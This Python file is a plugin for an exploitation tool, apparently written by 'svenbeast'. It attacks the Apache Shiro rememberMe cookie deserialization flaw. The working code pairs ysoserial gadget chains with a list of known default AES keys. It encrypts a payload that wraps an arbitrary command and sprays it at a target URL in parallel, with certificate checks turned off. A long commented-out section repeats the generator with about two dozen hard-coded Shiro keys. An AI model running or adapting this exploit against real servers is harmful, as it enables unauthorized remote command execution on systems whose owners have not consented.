# -*- coding: utf-8 -*-
# By 斯文beast  svenbeast.com

import os
import base64
import uuid
import subprocess
import requests
import sys
from Crypto.Cipher import AES
from ..main import Idea
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

JAR_FILE = 'moule/ysoserial.jar'

@Idea.plugin_register('Class1:CommonsBeanutils1')
class CommonsBeanutils1(object):
    keyList=[]
    javaModeList=["CommonsBeanutils1","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6"]



    def process(self,url,command):
        self.readKey();
        self.newPoc(url,command)
        # self.poc(url,command)

    def readKey(self):
        with open('key1.txt','r',encoding='utf-8') as keyFile:
            for line in keyFile.readlines():
                self.keyList.append(line.split()[0])

    def exp(self,url,command,mode):
        target=url
        try:
            for key in self.keyList:
                payload = self.newGenerator(command, JAR_FILE,key,mode)  # 生成payload
                r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=20,verify=False)  # 发送验证请求1
                # print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
                if (r.status_code == 200):
                    print("[+]   "+mode+"模块   key:"+key+" 已成功发送！")
                    print("[+]   状态码:" + str(r.status_code))
                else:
                    print("[-]   "+mode+"模块   key:"+key+" 发送异常！")
                    print("[-]   状态码:" + str(r.status_code))

        except Exception as e:
            print(e)

    def newPoc(self,url,command):

        try:
            pool = Pool(7)
            for l in self.javaModeList:
                pool.apply_async(self.exp,(url,command,l))
                # self.exp(url,command,l)
            pool.close()
            pool.join()
        except Exception as e:
            print(e)



    def newGenerator(self, command, fp,key,model):

        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, model, command],  # popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()

        #key = "kPH+bIxk5D2deZiIxcaaaA=="  # key

        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes

        encryptor = AES.new(base64.b64decode(key), mode, iv)  # 受key影响的encryptor

        file_body = pad(popen.stdout.read())  # 受popen影响的file_body

        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))

        return base64_ciphertext

    #  return False




    # def generator(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "kPH+bIxk5D2deZiIxcaaaA=="    #key
    #
    #
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
    #
    #     file_body = pad(popen.stdout.read())         #受popen影响的file_body
    #
    #
    #
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    # def generator2(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "wGiHplamyXlVB11UXWol8g=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    # def generator3(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "2AvVhdsgUs0FSA3SDFAdag=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    # def generator4(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "4AvVhmFLUs0KTA3Kprsdag=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    # def generator5(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "3AvVhmFLUs0KTA3Kprsdag=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    # def generator6(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "Z3VucwAAAAAAAAAAAAAAAA=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    # def generator7(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "U3ByaW5nQmxhZGUAAAAAAA=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    # def generator8(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "wGiHplamyXlVB11UXWol8g=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    # def generator9(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "6ZmI6I2j5Y+R5aSn5ZOlAA=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    #
    #
    # #分界线
    #
    #
    #
    #
    #     #后补编码
    #
    # def generator100(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "fCq+/xW488hMTCD+cmJ3aQ=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    # def generator111(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "1QWLxg+NYmxraMoxAXu/Iw=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    # def generator222(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "ZUdsaGJuSmxibVI2ZHc9PQ=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    #
    # def generator333(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "L7RioUULEFhRyxM7a2R/Yg=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    #
    # def generator444(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "r0e3c16IdVkouZgk1TKVMg=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    #
    # def generator555(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "ZWvohmPdUsAWT3=KpPqda"    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    #
    # def generator666(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "5aaC5qKm5oqA5pyvAAAAAA=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    #
    # def generator777(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "bWluZS1hc3NldC1rZXk6QQ=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    #
    # def generator888(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "a2VlcE9uR29pbmdBbmRGaQ=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    #
    # def generator999(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "WcfHGU25gNnTxTlmJMeSpw=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)
    #     file_body = pad(popen.stdout.read())
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    # def generator1111(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "LEGEND-CAMPUS-CIPHERKEY=="    #key
    #
    #
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
    #
    #     file_body = pad(popen.stdout.read())         #受popen影响的file_body
    #
    #
    #
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    # def generator_001(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "bWljcm9zAAAAAAAAAAAAAA=="    #key
    #
    #
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
    #
    #     file_body = pad(popen.stdout.read())         #受popen影响的file_body
    #
    #
    #
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    #
    # def generator_002(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #
    #     key = "MTIzNDU2Nzg5MGFiY2RlZg=="    #key
    #
    #
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
    #
    #     file_body = pad(popen.stdout.read())         #受popen影响的file_body
    #
    #
    #
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #
    #
    #     return base64_ciphertext
    # def generator_003(self,command, fp):
    #     if not os.path.exists(fp):
    #         raise Exception('jar file not found!')
    #     popen = subprocess.Popen(['java', '-jar', fp, 'CommonsBeanutils1', command],       #popen
    #                              stdout=subprocess.PIPE)
    #
    #     BS = AES.block_size
    #     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #     key = "5AvVhmFLUs0KTA3Kprsdag=="    #key
    #     mode = AES.MODE_CBC
    #     iv = uuid.uuid4().bytes
    #     encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
    #     file_body = pad(popen.stdout.read())         #受popen影响的file_body
    #     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    #     return base64_ciphertext


